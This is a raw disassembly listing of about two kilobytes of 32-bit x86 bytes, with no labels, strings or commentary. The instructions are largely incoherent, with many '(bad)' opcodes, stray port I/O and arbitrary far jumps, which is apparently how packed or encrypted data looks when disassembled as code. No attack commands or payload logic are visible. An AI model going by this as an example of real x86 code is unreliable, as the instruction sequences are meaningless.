  418bb9:	idiv   DWORD PTR [ebp+0x27]
  418bbc:	idiv   esi
  418bbe:	stos   DWORD PTR es:[edi],eax
  418bbf:	je     0x418c18
  418bc1:	pop    eax
  418bc2:	xor    DWORD PTR [ebp-0x54],esi
  418bc5:	sbb    dl,dl
  418bc7:	sub    edx,DWORD PTR [esi+edi*4-0x80]
  418bcb:	jl     0x418bc5
  418bcd:	xor    esp,0xffffffcc
  418bd0:	shl    BYTE PTR [edi],1
  418bd2:	pop    ebx
  418bd3:	cli    
  418bd4:	fucomp st(2)
  418bd6:	and    esi,DWORD PTR ds:0x32c211e
  418bdc:	les    edi,FWORD PTR [ebx-0x5e5d8b98]
  418be2:	ss aas 
  418be4:	neg    esp
  418be6:	push   esi
  418be7:	adc    bl,bl
  418be9:	adc    ebx,DWORD PTR [edx-0x1]
  418bec:	mov    esp,0xa8172a00
  418bf1:	adc    eax,0xcbaf6870
  418bf6:	in     eax,0xcf
  418bf8:	jl     0x418bcf
  418bfa:	cmp    eax,0x33e7a69c
  418bff:	mov    BYTE PTR [ebx+eiz*1-0x2ffa5f7f],al
  418c06:	push   0xffffff9f
  418c08:	fidivr WORD PTR [ebx+0x11241be4]
  418c0e:	mov    ds,WORD PTR [ebx-0x7966d11]
  418c14:	sbb    BYTE PTR [ebp+0x1f],al
  418c17:	fild   QWORD PTR [ebx+eiz*2]
  418c1a:	aaa    
  418c1b:	dec    ecx
  418c1c:	cmp    DWORD PTR [esi+0x5d34943c],0x55
  418c23:	mov    eax,0x4f4b35e9
  418c28:	fcom   st(3)
  418c2a:	mov    BYTE PTR [ebx-0x2d56c6a8],al
  418c30:	pop    ebx
  418c31:	scas   al,BYTE PTR es:[edi]
  418c32:	add    eax,0x90597cb5
  418c37:	(bad)  
  418c38:	hlt    
  418c39:	add    ebx,DWORD PTR [eax]
  418c3b:	ficom  WORD PTR [eax+0x25]
  418c3e:	rcr    BYTE PTR [eax+0x6fb672be],0x5d
  418c45:	mov    WORD PTR [esi],fs
  418c47:	iret   
  418c48:	(bad)  
  418c4a:	out    dx,eax
  418c4b:	out    0x8a,al
  418c4d:	outs   dx,DWORD PTR ds:[esi]
  418c4e:	jbe    0x418beb
  418c50:	not    DWORD PTR [ebp+0x6448582e]
  418c56:	test   BYTE PTR [ebp+0x14cda0da],ch
  418c5c:	scas   al,BYTE PTR es:[edi]
  418c5d:	dec    esp
  418c5e:	cmc    
  418c5f:	scas   eax,DWORD PTR es:[edi]
  418c60:	or     dh,BYTE PTR [eax+0x694653cd]
  418c66:	sbb    edx,ebp
  418c68:	cmp    al,BYTE PTR [esi+0x5bf859a1]
  418c6e:	out    0x6,al
  418c70:	sbb    al,0xec
  418c72:	scas   eax,DWORD PTR es:[edi]
  418c73:	out    0xf,al
  418c75:	pop    es
  418c76:	ficom  WORD PTR [edx-0x13dec003]
  418c7c:	outs   dx,BYTE PTR ds:[esi]
  418c7d:	(bad)
  418c81:	add    al,0x3d
  418c83:	sar    DWORD PTR [esp+ebx*2-0x58],cl
  418c87:	dec    ebx
  418c88:	adc    DWORD PTR [ecx],esp
  418c8a:	inc    esp
  418c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c8c:	popa   
  418c8d:	add    BYTE PTR es:[ecx-0x42fae256],dh
  418c94:	xchg   ebp,eax
  418c95:	adc    ebp,0x260c522c
  418c9b:	adc    edx,DWORD PTR [edx-0x35326c35]
  418ca1:	inc    esp
  418ca2:	adc    edi,DWORD PTR [edi-0x52]
  418ca5:	mov    dh,0x50
  418ca7:	je     0x418c66
  418ca9:	cmp    dh,BYTE PTR [ebp-0x9]
  418cac:	ret    0x8ee3
  418caf:	dec    DWORD PTR [eax+0x1b2e0aa8]
  418cb5:	mov    DWORD PTR [eax+0x30afdcf6],eax
  418cbb:	mov    eax,eax
  418cbd:	dec    ecx
  418cbe:	push   ebp
  418cbf:	and    al,0x2d
  418cc1:	or     BYTE PTR [ebx+0x3c],dl
  418cc4:	jge    0x418c60
  418cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cc7:	or     eax,DWORD PTR [ecx+ebx*1-0x38]
  418ccb:	push   ds
  418ccc:	stos   DWORD PTR es:[edi],eax
  418ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cce:	cmp    al,0x34
  418cd0:	enter  0x1d83,0xa8
  418cd4:	idiv   BYTE PTR [edx+ebp*2-0x4d]
  418cd8:	pop    ebp
  418cd9:	hlt    
  418cda:	push   ebp
  418cdb:	mov    ebx,DWORD PTR [edi]
  418cdd:	mov    al,0xba
  418cdf:	cli    
  418ce0:	mov    ds:0xa2c860ce,eax
  418ce5:	dec    edx
  418ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ce7:	in     al,0xc
  418ce9:	aas    
  418cea:	popa   
  418ceb:	mov    bh,0x9f
  418ced:	xor    eax,0x61e64fde
  418cf2:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cf4:	out    dx,eax
  418cf5:	repz enter 0xc182,0x48
  418cfa:	dec    edx
  418cfb:	rcr    ch,cl
  418cfd:	jmp    0xdbe6:0x8553119a
  418d04:	or     edx,ebx
  418d06:	pop    esi
  418d07:	sub    DWORD PTR [ebx],ebx
  418d09:	or     esp,DWORD PTR [edx-0x5b41eb83]
  418d0f:	sub    eax,0x31610a64
  418d14:	(bad)
  418d17:	xchg   DWORD PTR [esi+0x12f15040],eax
  418d1d:	out    0x7c,al
  418d1f:	(bad)  
  418d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d22:	mov    bh,0x49
  418d24:	push   esp
  418d25:	xchg   esi,ebx
  418d27:	sub    eax,0x23d4364f
  418d2c:	ins    BYTE PTR es:[edi],dx
  418d2d:	mov    dl,0xfc
  418d2f:	add    bh,ch
  418d31:	lea    eax,[edi+0x38]
  418d34:	add    DWORD PTR [edi],edx
  418d36:	add    eax,0x4257aab4
  418d3b:	add    bl,bh
  418d3d:	cmp    BYTE PTR [esi+0x11],dl
  418d40:	jecxz  0x418db4
  418d42:	adc    ecx,DWORD PTR [edi]
  418d44:	or     cl,ch
  418d46:	iret   
  418d47:	mov    BYTE PTR [ebp-0x6a8d01af],dl
  418d4d:	jbe    0x418cd8
  418d4f:	js     0x418da0
  418d51:	cwde   
  418d52:	not    DWORD PTR [ebx]
  418d54:	int3   
  418d55:	mov    eax,0x89fae11e
  418d5a:	mov    al,ds:0x9508f07d
  418d60:	sbb    bl,BYTE PTR [ebx-0x7e]
  418d63:	push   es
  418d64:	and    eax,0x26078079
  418d69:	idiv   bl
  418d6b:	cmc    
  418d6c:	xor    al,0x12
  418d6e:	jmp    0xfb65:0x6c417bf3
  418d75:	lods   al,BYTE PTR ds:[esi]
  418d76:	xor    BYTE PTR [ebx+ecx*1-0x6e7667de],bl
  418d7d:	or     eax,0xab75b970
  418d82:	xor    DWORD PTR [edx-0x38],edi
  418d85:	aad    0x10
  418d87:	pop    ebx
  418d88:	ja     0x418ddf
  418d8a:	xor    dl,BYTE PTR [edi-0x7]
  418d8d:	lods   al,BYTE PTR ds:[esi]
  418d8e:	enter  0x7a7d,0x35
  418d92:	adc    al,0xbe
  418d94:	push   esi
  418d95:	or     DWORD PTR [ecx],0xffffffa0
  418d98:	dec    ebx
  418d99:	pop    es
  418d9a:	lahf   
  418d9b:	clc    
  418d9c:	push   esp
  418d9d:	sbb    bh,cl
  418d9f:	ds stos DWORD PTR es:[di],eax
  418da2:	inc    esp
  418da3:	push   eax
  418da4:	sub    DWORD PTR [edx+0x8cbadeb],esp
  418daa:	sar    al,cl
  418dac:	xchg   edx,eax
  418dad:	arpl   WORD PTR [esi-0x15c059c2],dx
  418db3:	sub    eax,DWORD PTR [edx]
  418db5:	jl     0x418d9b
  418db7:	popf   
  418db8:	push   ebp
  418db9:	fisttp WORD PTR [edx-0x280e8c87]
  418dbf:	mov    cl,0xc6
  418dc1:	ins    BYTE PTR es:[edi],dx
  418dc2:	imul   edi,DWORD PTR [edx+0x64],0xeb873bcf
  418dc9:	sahf   
  418dca:	sbb    ah,ch
  418dcc:	pop    ds
  418dcd:	mov    ds:0xe8038850,eax
  418dd2:	mov    esp,0xba9a4c2d
  418dd7:	cmp    eax,0x9bb3e6d0
  418ddc:	pop    eax
  418ddd:	inc    eax
  418dde:	dec    eax
  418ddf:	xlat   BYTE PTR ds:[ebx]
  418de0:	neg    BYTE PTR [esi-0x3]
  418de3:	js     0x418dcf
  418de5:	cmp    esp,DWORD PTR [eax+0x77a819e2]
  418deb:	dec    edx
  418dec:	jno    0x418de1
  418dee:	push   ecx
  418def:	mov    ebx,DWORD PTR [eax]
  418df1:	fld    DWORD PTR [esi+ecx*4+0xb99738e]
  418df8:	jl     0x418e4a
  418dfa:	cmp    eax,0x3ca5661e
  418dff:	sar    DWORD PTR ds:0x9e52d21c,cl
  418e05:	push   0xfffffff4
  418e07:	add    BYTE PTR [ecx],dh
  418e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e0a:	dec    ebx
  418e0b:	mov    edi,0x6061c119
  418e10:	retf   0x6ca
  418e13:	or     DWORD PTR [ecx],edx
  418e15:	adc    dl,BYTE PTR [esi-0x36]
  418e18:	or     DWORD PTR [eax+0x3d],edx
  418e1b:	iret   
  418e1c:	out    0x7a,al
  418e1e:	lea    ebp,[eax-0x7d22c77b]
  418e24:	pop    es
  418e25:	or     BYTE PTR [edx],al
  418e27:	jbe    0x418e60
  418e29:	cwde   
  418e2a:	popf   
  418e2b:	adc    eax,0xd33c5675
  418e30:	jbe    0x418e2c
  418e32:	div    bh
  418e34:	test   DWORD PTR [ecx+0x7a],edx
  418e37:	cmp    ch,BYTE PTR [ecx]
  418e39:	loope  0x418eaf
  418e3b:	(bad)  
  418e3d:	fistp  DWORD PTR [eax+ebp*4]
  418e40:	lahf   
  418e41:	ja     0x418e33
  418e43:	or     BYTE PTR ds:0xe4cef719,cl
  418e49:	lock retf 
  418e4b:	data16 daa 
  418e4d:	dec    edi
  418e4e:	jo     0x418eac
  418e50:	mov    esp,esi
  418e52:	push   cs
  418e53:	push   ecx
  418e54:	in     al,dx
  418e55:	fdivr  DWORD PTR [esi]
  418e57:	cmp    ebp,DWORD PTR [edx+ebx*4]
  418e5a:	(bad)  
  418e5b:	fcom   QWORD PTR fs:[edi+0x2a]
  418e5f:	mov    dl,0x12
  418e61:	cmc    
  418e62:	cmp    eax,0x52e80888
  418e67:	retf   
  418e68:	xlat   BYTE PTR ds:[ebx]
  418e69:	cmp    cl,BYTE PTR [eax+edi*2]
  418e6c:	comiss xmm6,xmm6
  418e6f:	jne    0x418e9a
  418e71:	mov    al,0x26
  418e73:	xor    edx,DWORD PTR [edx+eax*4+0x70]
  418e77:	and    BYTE PTR [edx+eax*2-0x20],ah
  418e7b:	iret   
  418e7c:	fcmovnb st,st(5)
  418e7e:	ja     0x418e2a
  418e80:	pop    eax
  418e81:	test   cl,dh
  418e83:	push   ebp
  418e84:	stos   DWORD PTR es:[edi],eax
  418e85:	push   ebp
  418e86:	mov    ch,0xcc
  418e88:	fild   WORD PTR [edx-0x2d1bd52f]
  418e8e:	ds cs mov bh,0x7e
  418e92:	std    
  418e93:	add    BYTE PTR [ebx+ebx*2],ch
  418e96:	lock imul eax,DWORD PTR [ecx],0x86a7815e
  418e9d:	sub    esi,esi
  418e9f:	hlt    
  418ea0:	bound  ebx,QWORD PTR [ebx]
  418ea2:	adc    cl,BYTE PTR [ecx+0x65d06610]
  418ea8:	(bad)  
  418ea9:	imul   edi,DWORD PTR [ebp+0x3d],0x17
  418ead:	clc    
  418eae:	push   esp
  418eaf:	and    dl,BYTE PTR [ecx+0x37]
  418eb2:	retf   0x93db
  418eb5:	pop    edi
  418eb6:	xor    BYTE PTR [ebx],0x30
  418eb9:	add    eax,0x62584430
  418ebe:	dec    dl
  418ec0:	jge    0x418e69
  418ec2:	jb     0x418efb
  418ec4:	or     BYTE PTR ds:0xde4a51c9,bl
  418eca:	test   DWORD PTR [eax+0x4e762294],edx
  418ed0:	(bad)  
  418ed1:	outs   dx,DWORD PTR ds:[esi]
  418ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ed3:	loopne 0x418edb
  418ed5:	cld    
  418ed6:	nop
  418ed7:	lea    ebx,[edi+ecx*2-0x485ccb1b]
  418ede:	xor    dh,bh
  418ee0:	out    0x91,eax
  418ee2:	pop    eax
  418ee3:	and    al,0x26
  418ee5:	pusha  
  418ee6:	or     eax,edx
  418ee8:	pop    ss
  418ee9:	inc    esp
  418eea:	fimul  WORD PTR [ebx+0x18]
  418eed:	fisubr WORD PTR [ecx-0x73089329]
  418ef3:	icebp  
  418ef4:	sbb    eax,0x95be65fd
  418ef9:	mov    ebp,0x6a51afd6
  418efe:	out    0x6b,eax
  418f00:	sub    eax,0xef03d28
  418f05:	call   0xabd02e33
  418f0a:	sub    DWORD PTR ds:0x2aa1af2e,eax
  418f10:	sub    DWORD PTR fs:[eax-0x45],esi
  418f14:	popf   
  418f15:	ins    DWORD PTR es:[edi],dx
  418f16:	icebp  
  418f17:	shr    BYTE PTR [ebp+0x6f631158],1
  418f1d:	jl     0x418ebd
  418f1f:	and    al,0xe6
  418f21:	div    BYTE PTR [ebp+0x6e7c6f6d]
  418f27:	enter  0x7b8a,0x2b
  418f2b:	jmp    0x4215:0x46ada2c8
  418f32:	and    eax,0x730687fd
  418f37:	add    BYTE PTR [esi-0xe],dl
  418f3a:	inc    edx
  418f3b:	call   0xa778:0xafdae152
  418f42:	popf   
  418f43:	scas   eax,DWORD PTR es:[edi]
  418f44:	jb     0x418f5c
  418f46:	pop    esi
  418f47:	dec    ecx
  418f48:	les    esi,FWORD PTR [eax]
  418f4a:	pop    edi
  418f4b:	(bad)  
  418f4c:	pop    ebp
  418f4d:	ficom  DWORD PTR [ebx-0x6faf53ad]
  418f53:	and    eax,DWORD PTR ds:0xfa92c0e3
  418f59:	ja     0x418f74
  418f5b:	mul    DWORD PTR [ecx+0xf]
  418f5e:	repnz push ebx
  418f60:	popf   
  418f61:	icebp  
  418f62:	sbb    BYTE PTR ds:0xb24de2d9,0x5d
  418f69:	cmp    eax,0x311501ca
  418f6e:	sbb    DWORD PTR [edx+0x12],0x18
  418f72:	sbb    edi,DWORD PTR [edx+0xa]
  418f75:	enter  0x29c7,0x85
  418f79:	push   edi
  418f7a:	sbb    eax,0x29ccd157
  418f7f:	iret   
  418f80:	aaa    
  418f81:	mov    BYTE PTR ss:[ebx],cl
  418f84:	test   BYTE PTR [ebx],ah
  418f86:	ja     0x418f8c
  418f88:	sub    DWORD PTR [edx-0x657f770],ebp
  418f8e:	popa   
  418f8f:	xchg   edx,eax
  418f90:	jnp    0x418fb9
  418f92:	and    al,0xf5
  418f94:	mov    ebx,0x23268e1c
  418f99:	cld    
  418f9a:	push   ebp
  418f9b:	(bad)  
  418f9c:	pusha  
  418f9d:	(bad)  
  418f9e:	sub    ch,BYTE PTR [eax+eax*8]
  418fa1:	mov    esi,0x39ddaf99
  418fa6:	add    BYTE PTR [esi+0x2cb587ba],cl
  418fac:	push   esp
  418fad:	mov    ds:0xfaefb0e4,al
  418fb2:	(bad)  
  418fb3:	scas   eax,DWORD PTR es:[edi]
  418fb4:	inc    edi
  418fb5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  418fb7:	xor    DWORD PTR ds:0x89cefd07,esp
  418fbd:	jle    0x418f62
  418fbf:	rcl    ch,cl
  418fc1:	loopne 0x418fed
  418fc3:	imul   eax,DWORD PTR [ebx-0x42],0xffffff81
  418fc7:	push   cs
  418fc8:	sbb    esp,edx
  418fca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fcb:	neg    BYTE PTR ds:0x1c6068e1
  418fd1:	pop    ecx
  418fd2:	daa    
  418fd3:	or     dl,BYTE PTR [eax]
  418fd5:	popa   
  418fd6:	cdq    
  418fd7:	push   edx
  418fd8:	mov    al,cl
  418fda:	fld    DWORD PTR [ecx+edi*8]
  418fdd:	mov    ebp,0xb8642bfc
  418fe2:	mov    BYTE PTR ds:0xe32d,dl
  418fe7:	mov    ah,0xc3
  418fe9:	outs   dx,BYTE PTR ds:[esi]
  418fea:	add    esi,eax
  418fec:	out    0xc7,eax
  418fee:	pop    ebx
  418fef:	adc    dh,BYTE PTR [edi]
  418ff1:	mov    esp,0xdebb54b5
  418ff6:	xor    al,0xa7
  418ff8:	push   esp
  418ff9:	jbe    0x419044
  418ffb:	ss fsub st,st(2)
  418ffe:	xor    DWORD PTR [eax-0x66a6faed],ebp
  419004:	jnp    0x419014
  419006:	jo     0x41904c
  419008:	inc    ebp
  419009:	je     0x41902b
  41900b:	jle    0x418fe5
  41900d:	call   0x10b6f0df
  419012:	(bad)
  419015:	or     BYTE PTR [edi+ebx*2+0x28b989d9],dl
  41901c:	pop    DWORD PTR [ebp-0x26]
  41901f:	cmp    BYTE PTR [edi+0x15],0x5a
  419023:	mov    edi,0xc13c3bb3
  419028:	fstp   TBYTE PTR [ecx-0x17]
  41902b:	or     edx,ebx
  41902d:	and    ebx,edi
  41902f:	inc    ecx
  419030:	mov    ?,WORD PTR [esi]
  419032:	loope  0x419089
  419034:	mov    ch,0xe3
  419036:	aam    0x82
  419038:	jle    0x4190ab
  41903a:	outs   dx,BYTE PTR ds:[esi]
  41903b:	cs call edx
  41903e:	xlat   BYTE PTR ds:[ebx]
  41903f:	xchg   ebp,eax
  419040:	add    BYTE PTR [edi+0x63],dh
  419043:	ins    DWORD PTR es:[edi],dx
  419044:	in     al,0xba
  419046:	pop    ebx
  419047:	aaa    
  419048:	cli    
  419049:	jae    0x419014
  41904b:	bound  ebx,QWORD PTR [esi+edx*1+0x38331c22]
  419052:	call   0xc9416263
  419057:	mov    esi,0x5687ae60
  41905c:	pop    eax
  41905d:	outs   dx,BYTE PTR ds:[esi]
  41905e:	(bad)
  419061:	push   edi
  419062:	mov    ecx,0xdcbcd116
  419067:	and    DWORD PTR [edi],ebp
  419069:	enter  0x2f35,0x57
  41906d:	sbb    dh,BYTE PTR [ebx+0x58]
  419070:	ret    0x27c6
  419073:	push   edx
  419074:	ret    
  419075:	sub    BYTE PTR ds:0x7b93e7a1,dh
  41907b:	pop    edi
  41907c:	dec    eax
  41907d:	cdq    
  41907e:	gs loopne 0x41905e
  419081:	lods   eax,DWORD PTR ds:[esi]
  419082:	lods   eax,DWORD PTR ds:[esi]
  419083:	xchg   esp,eax
  419084:	test   DWORD PTR [edi],0x6f47580a
  41908a:	sub    DWORD PTR [esi+ebp*4],eax
  41908d:	adc    DWORD PTR [edi+0x5ed05e33],ecx
  419093:	xchg   edx,eax
  419094:	adc    eax,DWORD PTR [edx-0x684eb197]
  41909a:	out    dx,al
  41909b:	pop    ecx
  41909c:	daa    
  41909d:	cmc    
  41909e:	retf   0x5a39
  4190a1:	xchg   esp,eax
  4190a2:	adc    al,0xac
  4190a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190a5:	ins    DWORD PTR es:[edi],dx
  4190a6:	ins    DWORD PTR es:[edi],dx
  4190a7:	outs   dx,DWORD PTR ds:[esi]
  4190a8:	mov    ah,ch
  4190aa:	cmp    DWORD PTR [esi-0x4d],ebx
  4190ad:	xchg   ebp,eax
  4190ae:	push   ds
  4190af:	out    0x1d,al
  4190b1:	div    bh
  4190b3:	mov    esi,0xd56c361f
  4190b8:	pop    esp
  4190b9:	jmp    0x2028:0x32cdaecf
  4190c0:	cli    
  4190c1:	xlat   BYTE PTR ds:[ebx]
  4190c2:	pop    esi
  4190c3:	sahf   
  4190c4:	push   cs
  4190c5:	les    esi,FWORD PTR [ecx+edi*8]
  4190c8:	(bad)  
  4190c9:	xor    ch,ah
  4190cb:	mov    al,0xe1
  4190cd:	add    DWORD PTR ds:0x25c0a37f,ebx
  4190d3:	inc    ebp
  4190d4:	fcomp  DWORD PTR [edi-0x38]
  4190d7:	xchg   ecx,eax
  4190d8:	mov    ds:0x436107b3,eax
  4190dd:	push   ebp
  4190de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190df:	inc    ebp
  4190e0:	push   0xa0e80633
  4190e5:	cdq    
  4190e6:	outs   dx,BYTE PTR ds:[esi]
  4190e7:	outs   dx,BYTE PTR ds:[esi]
  4190e8:	mov    bl,0xc5
  4190ea:	out    dx,al
  4190eb:	adc    ecx,DWORD PTR [edi-0xd]
  4190ee:	jns    0x4190f7
  4190f0:	pop    ebp
  4190f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190f2:	call   0xe6b0:0x5c15c96b
  4190f9:	and    DWORD PTR [eax-0x12],0xc088b390
  419100:	mov    al,ds:0x66cb63fd
  419105:	cmp    al,0x0
  419107:	adc    BYTE PTR [edx+0x651bb39b],0xbd
  41910e:	sbb    bh,BYTE PTR [edx]
  419110:	push   ecx
  419111:	pop    esi
  419112:	jmp    FWORD PTR [eax+0x43dc9a06]
  419118:	fisttp QWORD PTR [edi+0x5f]
  41911b:	(bad)  
  41911c:	cmp    eax,0x7d0dc5ae
  419121:	and    dh,BYTE PTR [ebx]
  419123:	xor    eax,0xa3e7048c
  419128:	xchg   esp,eax
  419129:	jmp    0xf5fee7da
  41912e:	pop    edi
  41912f:	and    esi,DWORD PTR [eax]
  419131:	pop    ds
  419132:	sub    BYTE PTR [ebx+0x75],bl
  419135:	les    esi,FWORD PTR [eax]
  419137:	dec    edx
  419138:	xchg   edx,eax
  419139:	stos   BYTE PTR es:[edi],al
  41913a:	mov    dl,0xa2
  41913c:	jnp    0x4191a8
  41913e:	daa    
  41913f:	push   es
  419140:	mov    bh,BYTE PTR [ecx+0x16ff44fe]
  419146:	add    bl,bl
  419148:	pop    ebp
  419149:	out    dx,eax
  41914a:	mov    bh,0xf7
  41914c:	jo     0x419133
  41914e:	(bad)  
  41914f:	push   ebx
  419150:	out    dx,eax
  419151:	mov    ebx,0xd74839c0
  419156:	mov    cl,BYTE PTR [ecx+ebp*2+0x53]
  41915a:	in     al,0x31
  41915c:	add    eax,eax
  41915e:	das    
  41915f:	aad    0x8d
  419161:	add    ebx,DWORD PTR ds:0x7d045861
  419167:	mov    edx,0x3413dd03
  41916c:	xchg   ebx,eax
  41916d:	add    al,0xd7
  41916f:	test   al,0x31
  419171:	mov    ch,0xa2
  419173:	das    
  419174:	out    dx,al
  419175:	add    DWORD PTR [esi],esi
  419177:	sub    al,0x8a
  419179:	imul   esp,DWORD PTR ds:0x3e431512,0x5cb87b78
  419183:	loop   0x4191a2
  419185:	icebp  
  419186:	sub    al,0x7e
  419188:	sub    eax,0x6297631c
  41918d:	jmp    0xf1764f62
  419192:	xchg   ecx,eax
  419193:	das    
  419194:	push   ebx
  419195:	test   BYTE PTR [edx-0x7de62646],cl
  41919b:	ss jne 0x419176
  41919e:	arpl   WORD PTR [ecx-0x547ab361],ax
  4191a4:	jns    0x4191ad
  4191a6:	sti    
  4191a7:	hlt    
  4191a8:	jp     0x4191e1
  4191aa:	xchg   esi,eax
  4191ab:	ret    0xc94a
  4191ae:	aaa    
  4191af:	mov    esp,0xe23869b9
  4191b4:	add    dl,cl
  4191b6:	sar    BYTE PTR [ebp-0x39747fff],cl
  4191bc:	fcom   DWORD PTR [edx+0x5537b90f]
  4191c2:	xor    BYTE PTR [edi],bh
  4191c4:	xor    eax,0x775ece5f
  4191c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191ca:	jno    0x4191a9
  4191cc:	stos   BYTE PTR es:[edi],al
  4191cd:	pop    esp
  4191ce:	std    
  4191cf:	xchg   edx,ebx
  4191d1:	or     al,0x5e
  4191d3:	push   0xfdec3513
  4191d8:	inc    ebx
  4191d9:	test   eax,0xf49734f0
  4191de:	out    0x4,al
  4191e0:	mov    ?,WORD PTR [edi-0x17]
  4191e3:	clc    
  4191e4:	sar    DWORD PTR [ebp+0x637ac42],cl
  4191ea:	pop    edi
  4191eb:	add    esp,DWORD PTR [edi+esi*2]
  4191ee:	fdiv   st,st(4)
  4191f0:	sbb    dh,BYTE PTR [ebx+ebp*1]
  4191f3:	cdq    
  4191f4:	push   eax
  4191f5:	ficomp WORD PTR [ecx+0x59]
  4191f8:	into   
  4191f9:	lods   eax,DWORD PTR ds:[esi]
  4191fa:	sbb    DWORD PTR [ebp+0x71dffa6c],esp
  419200:	scas   al,BYTE PTR es:[edi]
  419201:	jns    0x419228
  419203:	jae    0x419265
  419205:	mov    edi,eax
  419207:	dec    ebx
  419208:	(bad)  
  419209:	cmc    
  41920a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41920b:	dec    ecx
  41920c:	push   ecx
  41920d:	popa   
  41920e:	div    edx
  419210:	push   ss
  419211:	call   0xec82:0xc323a517
  419218:	arpl   WORD PTR [ebp+0x76df80e4],si
  41921e:	lods   al,BYTE PTR ds:[esi]
  41921f:	sbb    DWORD PTR [eax],ebx
  419221:	pop    ebp
  419222:	and    bl,al
  419224:	(bad)  
  419225:	sbb    ecx,DWORD PTR [edx]
  419227:	das    
  419228:	ins    DWORD PTR es:[edi],dx
  419229:	ficom  DWORD PTR [ecx+ecx*4+0x29]
  41922d:	sahf   
  41922e:	dec    ecx
  41922f:	sti    
  419230:	sub    ch,BYTE PTR [ebx-0x31]
  419233:	test   dh,bl
  419235:	mov    esp,0xacc59ce5
  41923a:	or     esp,DWORD PTR [esp+edx*8-0x7e]
  41923e:	inc    esi
  41923f:	inc    eax
  419240:	sub    DWORD PTR [ebx],0x5f5a1056
  419246:	loopne 0x4191fc
  419248:	sbb    bh,dl
  41924a:	lds    esi,FWORD PTR [ebp+0x68676672]
  419250:	mov    dh,0x69
  419252:	sub    eax,0xcf1b55bf
  419257:	std    
  419258:	push   ebx
  419259:	repnz push eax
  41925b:	fld    st(1)
  41925d:	push   eax
  41925e:	mov    bh,0x12
  419260:	and    al,0xc8
  419262:	outs   dx,BYTE PTR ds:[esi]
  419263:	stos   DWORD PTR es:[edi],eax
  419264:	mov    al,0x10
  419266:	fimul  DWORD PTR [edi+eiz*2-0x3fbe1d0e]
  41926d:	loopne 0x419219
  41926f:	(bad)  
  419270:	enter  0xa45b,0x5c
  419274:	call   0x4eb:0x64276d5f
  41927b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41927c:	lods   eax,DWORD PTR ds:[esi]
  41927d:	arpl   WORD PTR [ecx],cx
  41927f:	xor    al,BYTE PTR [ebx+edi*4]
  419282:	sbb    bh,cl
  419284:	mov    eax,ds:0x11e91600
  419289:	bound  ecx,QWORD PTR [esi+0x73]
  41928c:	sbb    BYTE PTR [esi+0x5e],dl
  41928f:	stos   DWORD PTR es:[edi],eax
  419290:	jo     0x4192f5
  419292:	mov    bh,0x16
  419294:	imul   BYTE PTR [edx]
  419296:	pushf  
  419297:	sbb    BYTE PTR [esi+0x437441c4],0x1d
  41929e:	adc    eax,DWORD PTR [ecx-0xb]
  4192a1:	lods   eax,DWORD PTR ds:[esi]
  4192a2:	ss jle 0x4192f6
  4192a5:	(bad)  
  4192a6:	dec    BYTE PTR [edx]
  4192a8:	jns    0x41931a
  4192aa:	cdq    
  4192ab:	sub    eax,0x1be39618
  4192b0:	mov    cl,0x3f
  4192b2:	adc    al,0xe4
  4192b4:	jl     0x4192cc
  4192b6:	pop    eax
  4192b7:	(bad)  
  4192b9:	adc    cl,0x5a
  4192bc:	push   esp
  4192bd:	out    dx,al
  4192be:	mov    ds:0x7b842ea5,al
  4192c3:	push   cs
  4192c4:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192c6:	ins    DWORD PTR es:[edi],dx
  4192c7:	cmp    BYTE PTR [edx+0x27],ah
  4192ca:	loope  0x4192a4
  4192cc:	or     DWORD PTR [eax],esp
  4192ce:	int3   
  4192cf:	pop    esi
  4192d0:	xor    BYTE PTR [ecx],bl
  4192d2:	fmul   QWORD PTR [ebx+0x24]
  4192d5:	jmp    0x6f8a0ec8
  4192da:	mov    bh,0xfb
  4192dc:	or     DWORD PTR [eax+edx*2],ecx
  4192df:	cs retf 
  4192e1:	sub    BYTE PTR [ecx-0x6e],cl
  4192e4:	adc    ebx,esp
  4192e6:	cdq    
  4192e7:	or     eax,0xe512ad22
  4192ec:	xchg   ebp,eax
  4192ed:	enter  0x548,0x85
  4192f1:	add    al,0xf1
  4192f3:	pop    ds
  4192f4:	xchg   edx,eax
  4192f5:	and    al,0x3b
  4192f7:	(bad)  
  4192f8:	ss mov edi,0x738cd97d
  4192fe:	push   ds
  4192ff:	(bad)  
  419301:	or     al,0x83
  419303:	call   DWORD PTR [ecx-0x72beeca5]
  419309:	cli    
  41930a:	dec    esp
  41930b:	cdq    
  41930c:	xchg   ebx,eax
  41930d:	adc    al,0x12
  41930f:	aam    0x1
  419311:	loop   0x419360
  419313:	pop    edi
  419314:	adc    eax,esp
  419316:	data16 jp 0x4192f8
  419319:	data16 loope 0x419323
  41931c:	mov    cl,0xb7
  41931e:	bnd ja 0x419353
  419321:	pop    ecx
  419322:	jae    0x4192ca
  419324:	fwait
  419325:	or     ebp,DWORD PTR [esp]
  419328:	jbe    0x4192cb
  41932a:	test   DWORD PTR [edi],0x82d35b4
  419330:	int    0x49
  419332:	sub    DWORD PTR [ebp-0x2d],0x1a516699
  419339:	xor    dh,BYTE PTR [ebp+ecx*2-0x3451cc47]
  419340:	pop    DWORD PTR [ecx-0x34b1eaa4]
  419346:	mov    al,cl
  419348:	sbb    al,0x55
  41934a:	rdpmc  
  41934c:	mov    al,0xf3
  41934e:	or     BYTE PTR [edx+0x6b],0x84
  419352:	cmp    ah,BYTE PTR [ebp-0x37]
  419355:	or     edx,DWORD PTR [esi]
  419357:	push   ds
